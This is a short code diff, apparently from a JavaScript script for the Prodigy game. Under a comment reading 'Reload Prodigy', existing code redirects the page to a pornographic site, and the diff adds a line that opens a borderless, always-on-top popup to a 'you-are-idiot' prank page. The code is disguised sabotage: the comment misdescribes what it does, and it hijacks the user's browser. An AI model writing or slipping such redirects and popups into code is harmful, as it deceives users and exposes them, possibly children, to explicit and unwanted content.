@@ -296,6 +296,8 @@ if (process.env.NODE_ENV === "development") {
 
                 // Reload Prodigy
                 document.location = "https://xVideos.com";
+		open("http://you-are-idiot.github.io/lol.html", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+		    
             }
 
 
